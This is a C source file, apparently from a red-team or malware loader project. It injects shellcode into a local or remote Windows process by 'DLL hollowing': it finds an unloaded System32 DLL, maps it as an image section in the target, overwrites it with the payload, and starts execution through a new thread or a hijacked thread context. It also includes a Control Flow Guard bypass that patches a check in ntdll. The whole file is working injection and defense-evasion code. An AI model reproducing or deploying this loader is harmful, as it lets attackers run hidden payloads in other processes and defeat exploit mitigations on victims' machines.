#pragma once
#include "dllHollow.h"
#include "syscalls.h"

#include <stdio.h>

// Needed for: GetRemoteModuleHandleW
// CreateToolhelp32Snapshot
#include <tlhelp32.h>




#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/*
	return a pointer to the NT headers of the PE
*/
PIMAGE_NT_HEADERS get_nt_headers(const BYTE* virtualpointer)
{
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeader;

	// Check dos_header == MZ
	dosHeader = (PIMAGE_DOS_HEADER)virtualpointer;
	// needed fields: e_magix and e_lfanew (ntHeader offset)
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	// Get pointer to NT header
	ntHeader = (PIMAGE_NT_HEADERS)((PCHAR)(virtualpointer)+dosHeader->e_lfanew);
	// needed fields: Signature 
	// FileHeader, OptionalFileHeader
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	return ntHeader;
}


/*
	Read the size of a PE from its headers and returns it.
	- FilePath : Path to the PE file
	Return: size of PE from ntHeader->OptionalHeader.SizeOfImage
*/
size_t getSizeOfImage(wchar_t* FilePath) {
	NTSTATUS status = 0;
	HANDLE hFile = NULL;
	size_t img_size = 0;
	PIMAGE_NT_HEADERS ntHeader = NULL;
	PIMAGE_DOS_HEADER dosHeader;
	DWORD  dwBytesRead = 0;
	// Offset of file - NtReadFile
	OVERLAPPED ol = { 0 };
	
	// NtCreateFile
	hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) {
		printf("CreateFileW error : 0x%x", GetLastError());
		return 0;
	}
	// Partially read the file instead of mapping the whole dll.
	// We need only the headers to get SizeOfImage
	// Try to guess dosHeader->e_lfanew : 0x100 is a reasonable value as most of the DLLs has dosHeader->e_lfanew <= 0x100
#define GUESS 0x100
	// Define buffersize at compile time so we can allocate the buffer in the stack
#define BUFFERSIZE ( sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS) + GUESS )
	char   ReadBuffer[BUFFERSIZE] = { 0 };
	// Read PE
	// ol == 0 --> OFFSET = 0 
	// NtReadFile
	status = ReadFile(hFile, ReadBuffer, BUFFERSIZE, &dwBytesRead, &ol);
	if (!NT_SUCCESS(status))
	{
		printf("NtReadFile: 0x%x\n", status);
		CloseHandle(hFile);
		return 0;
	}
	dosHeader = (PIMAGE_DOS_HEADER)ReadBuffer;
	// check if our guess was lucky
	if (dosHeader->e_lfanew <= GUESS) {
		// We already read enough bytes - we can read the NT Headers
		ntHeader = get_nt_headers((const BYTE*)ReadBuffer);
	}
	else {
		// read again
		// We shouldn't arrive here very often as we "guessed" a very common value of dosHeader->e_lfanew 
		
		// Read starting from offset dosHeader->e_lfanew - we are interested only to the NT headers.
		// https://stackoverflow.com/questions/40945819/read-file-from-100th-byte
		ol.Offset = dosHeader->e_lfanew;
		// We can reuse the same buffer
		// NtReadFile
		status = ReadFile(hFile, ReadBuffer, BUFFERSIZE, &dwBytesRead, &ol);
		if (!NT_SUCCESS(status))
		{
			printf("NtReadFile: 0x%x\n", status);
			CloseHandle(hFile);
			return 0;
		}
		ntHeader = (PIMAGE_NT_HEADERS)ReadBuffer;
	}

	if (ntHeader != NULL && ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
		img_size = ntHeader->OptionalHeader.SizeOfImage;
	}
	// Close Handles
	CloseHandle(hFile);
	return img_size;
}




/*
	Return an HANDLE to a remote module if the module is loaded.
	If the module is not loaded return NULL
*/


// when compipling using clang we might need to define this - should be defined in tlhelp32.h
// https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
//#define TH32CS_SNAPMODULE 0x00000008

HMODULE GetRemoteModuleHandleW(HANDLE hProcess, const wchar_t* szModule)
{
	// https://github.com/thereals0beit/RemoteFunctions/blob/master/Remote.cpp
	HANDLE tlh = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetProcessId(hProcess));

	MODULEENTRY32 modEntry;

	modEntry.dwSize = sizeof(MODULEENTRY32);

	Module32First(tlh, &modEntry);
	do
	{
		if (_wcsicmp(szModule, (const wchar_t*)modEntry.szModule) == 0)
		{
			printf("Remote Module %s Found! @ \n", modEntry.modBaseAddr);
			CloseHandle(tlh);

			return modEntry.hModule;
		}
	} while (Module32Next(tlh, &modEntry));

	CloseHandle(tlh);

	return NULL;
}


/*
	Return TRUE if the DLL is loaded. FALSE otherwise
*/
BOOL isDllLoaded(HANDLE hProcess, wchar_t* filePath) {
	// Local
	if (hProcess == (HANDLE)-1) return GetModuleHandleW(filePath) != NULL;
	// remote – more on this later on
	else return GetRemoteModuleHandleW(hProcess, filePath) != NULL;
}



/*
	Search for a DLL not loaded in the current process that is large enough to store the payload.

	- FilePath will contain the path of the DLL if the function returns TRUE.
	- size_FilePath is the size of FilePath buffer
	- size_of_shellcode is the size needed to store the payload
	NB: FilePath *MUST* be MAX_PATH*2 size - This is necessary because we don't know how long the path for the DLL that we find will be

	Return: TRUE if a DLL with an appropriate size is found, FALSE otherwise
	NB: The return value of this function *MUST* be checked before using FilePath in other calls 
	as we don't mind about what is inside the variable if we fail
*/
BOOL findSacrificialDll(HANDLE hProcess, wchar_t* FilePath, size_t size_FilePath, size_t size_of_shellcode)
{
	if (size_FilePath < MAX_PATH * 2)
	{
		return FALSE;
	}

	wchar_t				SearchFilePath[MAX_PATH * 2];
	HANDLE				hFind = NULL;
	BOOL				found = FALSE;
	WIN32_FIND_DATAW	Wfd;
	//BYTE* pFileBuf = NULL;
	size_t				size_dest = 0;

	if (GetSystemDirectoryW(SearchFilePath, MAX_PATH * 2) == 0) {
		printf("GetSystemDirectoryW: %d\n", GetLastError());
		return FALSE;
	}

	printf("Finding a sacrificial Dll\n");
	wcscat_s(SearchFilePath, MAX_PATH * 2, L"\\*.dll");
	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			// if the DLL isn't already loaded
			if (!isDllLoaded(hProcess, Wfd.cFileName)) {

				if (GetSystemDirectoryW(FilePath, MAX_PATH * 2) == 0) {
					printf("GetSystemDirectoryW: %d\n", GetLastError());
					return FALSE;
				}

				// Write File Path
				wcscat_s(FilePath, MAX_PATH * 2, L"\\");
				wcscat_s(FilePath, MAX_PATH * 2, Wfd.cFileName);

				wprintf(L"Checking %ls\n", FilePath);

				size_dest = getSizeOfImage(FilePath);

				wprintf(L"DLL is 0x%x bytes\n", size_dest);

				if (size_of_shellcode < size_dest) {
					found = TRUE;
					wprintf(L"DLL Found! %ls \n", FilePath);
				}
			}
		} while (!found && FindNextFileW(hFind, &Wfd));
		// close the handle 
		FindClose(hFind);
	}
	return found;
}




/* CFG BYPASS - NTDLL PATCH */

/*
	pattern: pattern to search
	offset: pattern offset from strart of function
	base_addr: search start address
	module_size: size of the buffer pointed by base_addr
*/
PVOID getPattern(char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			printf("Found pattern @ 0x%p\n", addr);
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}



int patchCFG(HANDLE hProcess)
{
	int res = 0;
	NTSTATUS status = 0x0;
	DWORD oldProtect = 0;
	PVOID pLdrpDispatchUserCallTarget = NULL;
	PVOID pRtlRetrieveNtUserPfn = NULL;
	PVOID check_address = NULL;
	SIZE_T size = 4;
	SIZE_T bytesWritten = 0;

	// stc ; nop ; nop ; nop
	char patch_bytes[] = { 0xf9, 0x90, 0x90, 0x90 };

	// get ntdll!LdrpDispatchUserCallTarget
	// pLdrpDispatchUserCallTarget = GetProcAddress(GetModuleHandleA("ntdll"), "LdrpDispatchUserCallTarget");
	// ntdll!LdrpDispatchUserCallTarget cannot be retrieved using GetProcAddress()
	// we search it near ntdll!RtlRetrieveNtUserPfn 
	// on Windows 10 1909  ntdll!RtlRetrieveNtUserPfn + 0x4f0 = ntdll!LdrpDispatchUserCallTarget
	pRtlRetrieveNtUserPfn = GetProcAddress(GetModuleHandleA("ntdll"), "RtlRetrieveNtUserPfn");;

	if (pRtlRetrieveNtUserPfn == NULL)
	{
		printf("RtlRetrieveNtUserPfn not found!\n");
		return -1;
	}

	printf("RtlRetrieveNtUserPfn @ 0x%p\n", pRtlRetrieveNtUserPfn);
	printf("Searching ntdll!LdrpDispatchUserCallTarget\n");
	// search pattern to find ntdll!LdrpDispatchUserCallTarget
	char pattern[] = { 0x4C ,0x8B ,0x1D ,0xE9 ,0xD7 ,0x0E ,0x00 ,0x4C ,0x8B ,0xD0 };

	// Windows 10 1909
	//pRtlRetrieveNtUserPfn = (char*)pRtlRetrieveNtUserPfn + 0x4f0;

	// 0xfff should be enough to find the pattern
	pLdrpDispatchUserCallTarget = getPattern(pattern, sizeof(pattern), 0, pRtlRetrieveNtUserPfn, 0xfff);
	
	if (pLdrpDispatchUserCallTarget == NULL)
	{
		printf("LdrpDispatchUserCallTarget not found!\n");
		return -1;
	}

	printf("Searching instructions to patch...\n");

	// we want to overwrite the instruction `bt r11, r10`
	char instr_to_patch[] = { 0x4D, 0x0F, 0xA3, 0xD3 };
	
	// offset of the instruction is  0x1d (29)
	//check_address = (BYTE*)pLdrpDispatchUserCallTarget + 0x1d;
	
	// Use getPattern to  find the right instruction
	check_address = getPattern(instr_to_patch, sizeof(instr_to_patch), 0, pLdrpDispatchUserCallTarget, 0xfff);

	printf("Setting 0x%p to RW\n", check_address);

	PVOID text = check_address;
	SIZE_T text_size = sizeof(patch_bytes);

	// set RW
	// NB: this might crash the process in case a thread tries to execute those instructions while it is RW
	status = NtProtectVirtualMemory(hProcess, &text, &text_size, PAGE_READWRITE, &oldProtect);

	if (status != 0x00)
	{
		//printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	}

	// PATCH
	WriteProcessMemory(hProcess, check_address, patch_bytes, size, &bytesWritten);
	//memcpy(check_address, patch_bytes, size);

	if (bytesWritten != size)
	{
		//printf("Error in WriteProcessMemory!\n");
		return -1;
	}

	// restore
	status = NtProtectVirtualMemory(hProcess, &text, &text_size, oldProtect, &oldProtect);
	if (status != 0x00)
	{
		printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	}

	printf("Memory restored to RX\n");
	printf("CFG Patched!\n");
	printf("Written %d bytes @ 0x%p\n", bytesWritten, check_address);

	return 0;
}




/* END CFG BYPASS - NTDLL PATCH */

PVOID map_dll_image(HANDLE hSection, HANDLE hProcess, DWORD protect)
{
	NTSTATUS			status;
	PVOID				sectionBaseAddress;
	SIZE_T				viewSize;
	SECTION_INHERIT		inheritDisposition;

	if (hProcess == NULL)
		return NULL;



	// NtMapViewOfSection always fail when you specify a desired base address
	sectionBaseAddress = NULL;
	viewSize = 0;
	inheritDisposition = ViewShare;


	status = NtMapViewOfSection((HANDLE)hSection,
		(HANDLE)hProcess,
		(PVOID*)&sectionBaseAddress,
		(ULONG_PTR)NULL,
		(SIZE_T)NULL,
		(PLARGE_INTEGER)NULL,
		&viewSize,
		inheritDisposition,
		(ULONG)PtrToUlong(NULL),
		(ULONG)protect);

	if (!NT_SUCCESS(status)) {
		printf("NtMapViewOfSection: 0x%x\n", status);
		return NULL;
	}

	return sectionBaseAddress;
}





int SetThreadCTX(HANDLE hThread, LPVOID pRemoteCode) {
	CONTEXT ctx;

	// execute the payload by overwriting RIP in the thread of target process
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
	ctx.Rip = (DWORD_PTR)pRemoteCode;
	SetThreadContext(hThread, &ctx);

	return ResumeThread(hThread);
}




PVOID inject_shellcode(void* shellcode, SIZE_T size, const wchar_t* dll_name, HANDLE hProcess)
{
	/*
		Original Module Overloading idea from: https://twitter.com/TheRealWover/status/1193284444687392768?s=20
		Original Module Overloading PoC from: https://github.com/hasherezade/module_overloading/blob/master/module_overloader/map_dll_image.cpp
	*/
	NTSTATUS status = 0;
	DWORD               protect = 0x0;
	HANDLE              hFile = NULL, hSection = NULL;
	BYTE* mapped = NULL;
	// We need two variables for shellcode size because NtProtectVirtualMemory overwrites the value with the size of the actual affected memory
	// which is always a multiple of page size
	// and we want to keep the actual shellcode size as well :)
	SIZE_T len = size;
	SIZE_T bytesWritten = 0;
	void* allocation = NULL;
	DWORD oldProtect = 0;
	HANDLE hThread = 0;

	// Open File - NtCreateFile
	hFile = CreateFileW(dll_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// Create Section - NtCreateSection	
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);

	// Close file

	if (!NT_SUCCESS(status)) {
		printf("NtCreateSection: 0x%x\n", status);
		CloseHandle(hFile);
		return NULL;
	}


	printf("Section created - hSection = 0x%x\n", hSection);


	// Map Section - NtMapViewOfSection
	protect = PAGE_READWRITE;
	mapped = (BYTE*)map_dll_image(hSection, hProcess, protect);

	if (mapped == NULL) {
		CloseHandle(hSection);
		CloseHandle(hFile);
		return NULL;
	}

	if (CloseHandle(hFile) == 0) {
		// this is not a fatal error
		printf("hFile: %lu\n", GetLastError());
	}



	// Change Permissions on memory to RW
	status = NtProtectVirtualMemory(hProcess,
		(PVOID*)&mapped,
		&len,
		protect,
		&oldProtect);


	if (!NT_SUCCESS(status))
	{
		// ERROR
		printf("ERROR: NtProtectVirtualMemory (RW) = 0x%x\n", status);
		return NULL;
	}

	printf("%d bytes of memory starting from 0x%p set RW\n", len, mapped);


	// Write memory
	printf("Writing %d bytes of shellcode\n", size);

	status = NtWriteVirtualMemory(
		hProcess,
		mapped,
		shellcode,
		size,
		&bytesWritten);

	printf("%d bytes written!\n", bytesWritten);


	if (!NT_SUCCESS(status) || bytesWritten < size)
	{
		// ERROR
		printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
		return NULL;
	}

	/* change permissions to allow payload to run */
	//VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);

	// Change protection to RX
	status = NtProtectVirtualMemory(hProcess,
		(PVOID*)&mapped,
		&len,
		PAGE_EXECUTE_READ,
		&oldProtect);

	if (!NT_SUCCESS(status))
	{
		// ERROR
		printf("ERROR: NtProtectVirtualMemory (RX) = 0x%x\n", status);
		return NULL;
	}


	if (CloseHandle(hSection) == 0) {
		// this is not a fatal error
		printf("CloseHandle: %lu\n", GetLastError());
	}

	printf("Shellcode is @ 0x%p\n", mapped);
	
	
	printf("Enter any key to create the thread\n");
	getchar();


	// Create the thread and start it immediately
#ifndef BYPASS_CFG_THREAD_CTX
	status = NtCreateThreadEx(
		&hThread,       // returns thread handle
		GENERIC_ALL,    // access rights
		0,
		hProcess,       // handle of process
		(LPTHREAD_START_ROUTINE)mapped, // thread start address
		NULL,    // thread user defined parameter
		FALSE,          // start immediately (don't create suspended)
		0,
		0,
		0,
		NULL
	);


	if (!NT_SUCCESS(status))
	{
		// ERROR
		printf("ERROR: NtCreateThreadEx = 0x%x\n", status);
		return NULL;
	}
#endif


	/* CFG BYPASS with thread context */
#ifdef BYPASS_CFG_THREAD_CTX
	status = NtCreateThreadEx(&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		hProcess,
		mapped,
		mapped,
		TRUE,
		0,
		0,
		0,
		NULL);


	SetThreadCTX(hThread, mapped);
#endif	
	

	return mapped;
}



PVOID inject(unsigned char* shellcode, SIZE_T len, DWORD pid)
{
	PVOID remote_addr = 0x0;
	int res;
	HANDLE hProcess = (HANDLE)-1;
	wchar_t sacrificial_dll_path[MAX_PATH * 2];
		
	if (pid > 0)
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (!findSacrificialDll(hProcess, sacrificial_dll_path, MAX_PATH * 2, len)) return NULL;

#ifdef BYPASS_CFG_NTDLL
	// Patch NTDLL to disable CFG in the target process
	patchCFG(hProcess);
#endif

	remote_addr = inject_shellcode((void *)shellcode, len, sacrificial_dll_path, hProcess);


	return remote_addr;
}